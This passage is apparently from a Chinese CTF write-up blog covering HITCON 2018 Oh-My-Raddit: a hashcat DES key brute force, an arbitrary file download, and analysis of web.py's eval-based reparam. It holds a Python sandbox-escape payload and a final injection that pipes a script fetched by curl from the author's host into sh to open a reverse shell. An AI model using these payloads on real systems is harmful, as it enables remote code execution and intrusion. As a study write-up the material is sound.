+<p>将所有的明文都8 bytes个一组进行分开，发现多个明文的末尾都出现了<code>3ca92540eb2d0a42</code>,猜想这可能是DES的padding<code>\x08\x08\x08\x08\x08\x08\x08\x08</code>的加密结果。</p>
+<p>然后尝试爆破这对明密文对（自己写的python程序太慢了，哎…）：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 14000 3ca92540eb2d0a42:0808080808080808 -a 3 -1 acegikmoqsuwy ?1?1?1?1?1?1?1?1 --force</span><br></pre></td></tr></table></figure>
+
+<p>最后爆破出来的密钥是<code>ldgonaro</code>，根据出题人的提示，需要获取到题目源码。</p>
+<p>又发现链接：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"?s=2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42"</span>&gt;</span>down<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以下载一个pdf文件，于是利用上面的密钥解密这条数据：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">ENCRPYTION_KEY = <span class="string">'ldgonaro'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = s.decode(<span class="string">'hex'</span>)</span><br><span class="line">        cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">        data = cipher.decrypt(data)</span><br><span class="line">        print(data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> e.message</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">decrypt(<span class="string">'2e7e305f2da018a2cf8208fa1fefc238522c932a276554e5f8085ba33f9600b301c3c95652a912b0342653ddcdc4703e5975bd2ff6cc8a133ca92540eb2d0a42'</span>)</span><br><span class="line"><span class="comment"># 得到数据</span></span><br><span class="line"><span class="comment"># m=d&amp;f=uploads%2F70c97cc1-079f-4d01-8798-f36925ec1fd7.pdf</span></span><br></pre></td></tr></table></figure>
+
+<p>于是猜想这里可能是个任意文件下载，然后加密数据<code>m=d&amp;f=app.py</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">ENCRPYTION_KEY = <span class="string">'ldgonaro'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s)</span>:</span></span><br><span class="line">    length = DES.block_size - (len(s) % DES.block_size)</span><br><span class="line">    s = s + chr(length)*length</span><br><span class="line"></span><br><span class="line">    cipher = DES.new(ENCRPYTION_KEY, DES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(s).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">print(encrypt(<span class="string">'m=d&amp;f=app.py'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#e2272b36277c708bc21066647bc214b8</span></span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://13.115.255.46/?s=e2272b36277c708bc21066647bc214b8</code>成功获取到题目源码。源码中有密钥。</p>
+<h3 id="Oh-My-Raddit-2-学习笔记"><a href="#Oh-My-Raddit-2-学习笔记" class="headerlink" title="Oh-My-Raddit-2 学习笔记"></a>Oh-My-Raddit-2 学习笔记</h3><p>题目提示需要getshell,拿到代码就可以代码审计了。</p>
+<p>主要是利用了web.py的一个任意代码执行的漏洞，参考链接<a href="https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/" target="_blank" rel="noopener">https://securityetalii.es/2014/11/08/remote-code-execution-in-web-py-framework/</a>，下面自己的分析一下这个漏洞的成因。</p>
+<p>漏洞主要存在web.py框架的db.py文件中：</p>
+<p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reparam</span><span class="params">(string_, dictionary)</span>:</span> </span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Takes a string and a dictionary and interpolates the string</span></span><br><span class="line"><span class="string">    using values from the dictionary. Returns an `SQLQuery` for the result.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; reparam("s = $s", dict(s=True))</span></span><br><span class="line"><span class="string">        &lt;sql: "s = 't'"&gt;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; reparam("s IN $s", dict(s=[1, 2]))</span></span><br><span class="line"><span class="string">        &lt;sql: 's IN (1, 2)'&gt;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    dictionary = dictionary.copy() <span class="comment"># eval mucks with it</span></span><br><span class="line">    <span class="comment"># disable builtins to avoid risk for remote code exection.</span></span><br><span class="line">    dictionary[<span class="string">'__builtins__'</span>] = object()</span><br><span class="line">    vals = []</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> live, chunk <span class="keyword">in</span> _interpolate(string_):</span><br><span class="line">        <span class="keyword">if</span> live:</span><br><span class="line">            v = eval(chunk, dictionary)</span><br><span class="line">            result.append(sqlquote(v))</span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            result.append(chunk)</span><br><span class="line">    <span class="keyword">return</span> SQLQuery.join(result, <span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_interpolate</span><span class="params">(format)</span>:</span> </span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Takes a format string and returns a list of 2-tuples of the form</span></span><br><span class="line"><span class="string">    (boolean, string) where boolean says whether string should be evaled</span></span><br><span class="line"><span class="string">    or not.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    from &lt;http://lfw.org/python/Itpl.py&gt; (public domain, Ka-Ping Yee)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">from</span> tokenize <span class="keyword">import</span> tokenprog</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">matchorfail</span><span class="params">(text, pos)</span>:</span></span><br><span class="line">        match = tokenprog.match(text, pos)</span><br><span class="line">        <span class="keyword">if</span> match <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> _ItplError(text, pos)</span><br><span class="line">        <span class="keyword">return</span> match, match.end()</span><br><span class="line"></span><br><span class="line">    namechars = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span> \</span><br><span class="line">        <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"</span>;</span><br><span class="line">    chunks = []</span><br><span class="line">    pos = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        dollar = format.find(<span class="string">"$"</span>, pos)</span><br><span class="line">        <span class="keyword">if</span> dollar &lt; <span class="number">0</span>: </span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        nextchar = format[dollar + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nextchar == <span class="string">"&#123;"</span>:</span><br><span class="line">            chunks.append((<span class="number">0</span>, format[pos:dollar]))</span><br><span class="line">            pos, level = dollar + <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> level:</span><br><span class="line">                match, pos = matchorfail(format, pos)</span><br><span class="line">                tstart, tend = match.regs[<span class="number">3</span>]</span><br><span class="line">                token = format[tstart:tend]</span><br><span class="line">                <span class="keyword">if</span> token == <span class="string">"&#123;"</span>: </span><br><span class="line">                    level = level + <span class="number">1</span></span><br><span class="line">                <span class="keyword">elif</span> token == <span class="string">"&#125;"</span>:  </span><br><span class="line">                    level = level - <span class="number">1</span></span><br><span class="line">            chunks.append((<span class="number">1</span>, format[dollar + <span class="number">2</span>:pos - <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> nextchar <span class="keyword">in</span> namechars:</span><br><span class="line">            chunks.append((<span class="number">0</span>, format[pos:dollar]))</span><br><span class="line">            match, pos = matchorfail(format, dollar + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">while</span> pos &lt; len(format):</span><br><span class="line">                <span class="keyword">if</span> format[pos] == <span class="string">"."</span> <span class="keyword">and</span> \</span><br><span class="line">                    pos + <span class="number">1</span> &lt; len(format) <span class="keyword">and</span> format[pos + <span class="number">1</span>] <span class="keyword">in</span> namechars:</span><br><span class="line">                    match, pos = matchorfail(format, pos + <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">elif</span> format[pos] <span class="keyword">in</span> <span class="string">"(["</span>:</span><br><span class="line">                    pos, level = pos + <span class="number">1</span>, <span class="number">1</span></span><br><span class="line">                    <span class="keyword">while</span> level:</span><br><span class="line">                        match, pos = matchorfail(format, pos)</span><br><span class="line">                        tstart, tend = match.regs[<span class="number">3</span>]</span><br><span class="line">                        token = format[tstart:tend]</span><br><span class="line">                        <span class="keyword">if</span> token[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">"(["</span>: </span><br><span class="line">                            level = level + <span class="number">1</span></span><br><span class="line">                        <span class="keyword">elif</span> token[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">")]"</span>:  </span><br><span class="line">                            level = level - <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            chunks.append((<span class="number">1</span>, format[dollar + <span class="number">1</span>:pos]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chunks.append((<span class="number">0</span>, format[pos:dollar + <span class="number">1</span>]))</span><br><span class="line">            pos = dollar + <span class="number">1</span> + (nextchar == <span class="string">"$"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> pos &lt; len(format): </span><br><span class="line">        chunks.append((<span class="number">0</span>, format[pos:]))</span><br><span class="line">    <span class="keyword">return</span> chunks</span><br></pre></td></tr></table></figure>
+
+<p>函数_interpolate的目的就是为了把格式化的sql语句例如:<code>a= ${s} and b= $s</code>变为为一个list</p>
+<p><code>[(0, &#39;a= &#39;), (1, &#39;s&#39;), (0, &#39; and b= &#39;), (1, &#39;s&#39;)]</code>，然后通过eval函数来获取后面dictionary定义的命名空间中变量的值：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> live, chunk <span class="keyword">in</span> _interpolate(string_):</span><br><span class="line">    <span class="keyword">if</span> live:</span><br><span class="line">        v = eval(chunk, dictionary) <span class="comment"># dictionary = &#123;"s":"test"&#125;</span></span><br><span class="line">        result.append(sqlquote(v))</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        result.append(chunk)</span><br></pre></td></tr></table></figure>
+
+<p>只看上面的代码，任意代码执行，非常简单了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">16</span>]: eval(<span class="string">"__import__('os').getcwd()"</span>,&#123;<span class="string">'s'</span>:<span class="string">"test"</span>&#125;)</span><br><span class="line">Out[<span class="number">16</span>]: <span class="string">'/Volumes/data/ctf/2018hitcon/oh_my_raddit'</span></span><br></pre></td></tr></table></figure>
+
+<p>但是上面有一个操作：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">disable</span> builtins <span class="keyword">to</span> avoid risk <span class="keyword">for</span> remote code exection.</span><br><span class="line"> <span class="keyword">dictionary</span>[<span class="string">'__builtins__'</span>] = <span class="keyword">object</span>()</span><br></pre></td></tr></table></figure>
+
+<p>把dictionary命名空间中的内建模块给替换掉了，所以导致<code>__import__</code>找不到了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">28</span>]: a[<span class="string">"__builtins__"</span>] = object()</span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: eval(<span class="string">"__import__('os').getcwd()"</span>,a)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">NameError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-29</span><span class="number">-47</span>f22339b750&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line">----&gt; 1 eval("__import__('os').getcwd()",a)</span><br><span class="line"></span><br><span class="line">&lt;string&gt; <span class="keyword">in</span> &lt;module&gt;()</span><br><span class="line"></span><br><span class="line">NameError: name <span class="string">'__import__'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>
+
+<p>但是这个很显然可以通过绕过没有内建模块的python沙箱的方法绕过这个限制:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">"[item for item in [].__class__.__bases__[0].__subclasses__() if item.__name__=='catch_warnings' ][0]()._module.__builtins__['__import__']('os').system('pwd')"</span>,a)</span><br></pre></td></tr></table></figure>
+
+<p>payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(reparam(<span class="string">"a=$&#123;[item for item in [].__class__.__bases__[0].__subclasses__() if item.__name__=='catch_warnings' ][0]()._module.__builtins__['__import__']('os').system('pwd')&#125;"</span>,dict(s=<span class="string">'test'</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>看一下app.py的代码<code>method=&quot;p&quot;</code>的时候：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> method == <span class="string">'p'</span>:</span><br><span class="line">    limit = s.get(<span class="string">'l'</span>)</span><br><span class="line">    <span class="keyword">return</span> web.template.frender(<span class="string">'templates/index.html'</span>)(get_posts(limit), get_urls())</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_posts</span><span class="params">(limit=None)</span>:</span></span><br><span class="line">    records = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> db.select(<span class="string">'posts'</span>, limit=limit, order=<span class="string">'ups desc'</span>):</span><br><span class="line">        tmp = &#123;</span><br><span class="line">            <span class="string">'m'</span>: <span class="string">'r'</span>, </span><br><span class="line">            <span class="string">'t'</span>: i.title.encode(<span class="string">'utf-8'</span>, <span class="string">'ignore'</span>), </span><br><span class="line">            <span class="string">'u'</span>: i.id, </span><br><span class="line">        &#125; </span><br><span class="line">        tmp[<span class="string">'param'</span>] = encrypt(urllib.urlencode(tmp))</span><br><span class="line">        tmp[<span class="string">'ups'</span>] = i.ups</span><br><span class="line">        <span class="keyword">if</span> i.file:</span><br><span class="line">            tmp[<span class="string">'file'</span>] = encrypt(urllib.urlencode(&#123;<span class="string">'m'</span>: <span class="string">'d'</span>, <span class="string">'f'</span>: i.file&#125;))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp[<span class="string">'file'</span>] = <span class="string">''</span></span><br><span class="line">        </span><br><span class="line">        records.append( tmp )</span><br><span class="line">    <span class="keyword">return</span> records</span><br></pre></td></tr></table></figure>
+
+<p>看到get_posts函数执行了db.select操作，把用户的limit参数带入了<code>reparam</code>函数，造成任意代码执行。</p>
+<p>所以构造数据,就可以任意代码执行了,反弹shell，拿到flag:</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"m=p&amp;l=$&#123;[<span class="string">item for item in [</span>].<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>() if item.<span class="strong">__name__</span>=='catch<span class="emphasis">_warnings' ][0]()._</span>module.<span class="strong">__builtins__</span>[<span class="string">'__import__'</span>](<span class="link">'os'</span>).system('curl http://wonderkun.cc:3000/wonderkun.cc:8888|sh')&#125;'&#125;"</span><br></pre></td></tr></table></figure>
+        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-9381923643450020"
+     data-ad-slot="2524986173"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+        <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- 页面嵌入广告 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9381923643450020"
+     data-ad-slot="3413388404"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/hitcon2018/" rel="tag"># hitcon2018</a>
+              <a href="/tags/python/" rel="tag"># python</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/10/23/hitcon%202018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%B8%80%20one-line-php-challenge%20%E5%AD%A6%E4%B9%A0/" rel="prev" title="hitcon 2018受虐笔记一:one-line-php-challenge 学习">
+      <i class="fa fa-chevron-left"></i> hitcon 2018受虐笔记一:one-line-php-challenge 学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/10/26/hitcon2018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%B8%89%20BabyCake%E5%AD%A6%E4%B9%A0/" rel="next" title="hitcon2018受虐笔记三:BabyCake学习">
+      hitcon2018受虐笔记三:BabyCake学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Oh-My-Raddit-1-学习笔记"><span class="nav-number">1.</span> <span class="nav-text">Oh-My-Raddit-1 学习笔记</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Oh-My-Raddit-2-学习笔记"><span class="nav-number">2.</span> <span class="nav-text">Oh-My-Raddit-2 学习笔记</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="wonderkun"
+      src="https://pic.wonderkun.cc/uploads/2016/04/09451H922-11.jpg">
+  <p class="site-author-name" itemprop="name">wonderkun</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">58</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">46</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/wonderkun" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wonderkun" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/729173164@qq.com" title="E-Mail → 729173164@qq.com"><i class="QQ fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.leavesongs.com/" title="https:&#x2F;&#x2F;www.leavesongs.com&#x2F;" rel="noopener" target="_blank">phithon</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.bertramc.cn/" title="https:&#x2F;&#x2F;www.bertramc.cn&#x2F;" rel="noopener" target="_blank">berTrAM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.cnblogs.com/" title="http:&#x2F;&#x2F;www.cnblogs.com&#x2F;" rel="noopener" target="_blank">l3m0n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yulegeyu.com/" title="http:&#x2F;&#x2F;www.yulegeyu.com&#x2F;" rel="noopener" target="_blank">雨神</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.wupco.cn/" title="http:&#x2F;&#x2F;www.wupco.cn&#x2F;" rel="noopener" target="_blank">wupco</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.bendawang.site/" title="http:&#x2F;&#x2F;www.bendawang.site&#x2F;" rel="noopener" target="_blank">bendawang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://pcat.cnblogs.com/" title="http:&#x2F;&#x2F;pcat.cnblogs.com&#x2F;" rel="noopener" target="_blank">pcat</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yqxiaojunjie.com/" title="http:&#x2F;&#x2F;www.yqxiaojunjie.com&#x2F;" rel="noopener" target="_blank">乐清小俊杰</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://lorexxar.cn/" title="https:&#x2F;&#x2F;lorexxar.cn&#x2F;" rel="noopener" target="_blank">LoRexxar</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://pupiles.com/" title="http:&#x2F;&#x2F;pupiles.com&#x2F;" rel="noopener" target="_blank">Pupil</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.venenof.com/" title="http:&#x2F;&#x2F;www.venenof.com&#x2F;" rel="noopener" target="_blank">venenof</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.bywalks.com/" title="http:&#x2F;&#x2F;www.bywalks.com&#x2F;" rel="noopener" target="_blank">bywalks</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://chybeta.github.io/" title="https:&#x2F;&#x2F;chybeta.github.io&#x2F;" rel="noopener" target="_blank">chybeta</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://blog.evalbug.com/" title="http:&#x2F;&#x2F;blog.evalbug.com&#x2F;" rel="noopener" target="_blank">yan表哥</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://pav1.cc/wordpress/" title="http:&#x2F;&#x2F;pav1.cc&#x2F;wordpress&#x2F;" rel="noopener" target="_blank">Pav1师傅</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.venenof.com/" title="http:&#x2F;&#x2F;www.venenof.com&#x2F;" rel="noopener" target="_blank">venenof7</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.smi1e.top/" title="https:&#x2F;&#x2F;www.smi1e.top&#x2F;" rel="noopener" target="_blank">smi1e</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://afang5472.blogspot.com/" title="https:&#x2F;&#x2F;afang5472.blogspot.com&#x2F;" rel="noopener" target="_blank">afang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://rebirthwyw.com/" title="https:&#x2F;&#x2F;rebirthwyw.com&#x2F;" rel="noopener" target="_blank">rebirthwyw</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://ww9210.cn/" title="https:&#x2F;&#x2F;ww9210.cn&#x2F;" rel="noopener" target="_blank">ww9210</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://magicbluech.github.io/" title="https:&#x2F;&#x2F;magicbluech.github.io&#x2F;" rel="noopener" target="_blank">magicbluech</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://d1nn3r.github.io/" title="https:&#x2F;&#x2F;d1nn3r.github.io&#x2F;" rel="noopener" target="_blank">d1nn3r</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.rai4over.cn/" title="http:&#x2F;&#x2F;www.rai4over.cn&#x2F;" rel="noopener" target="_blank">rai4over</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+      
+    </div>
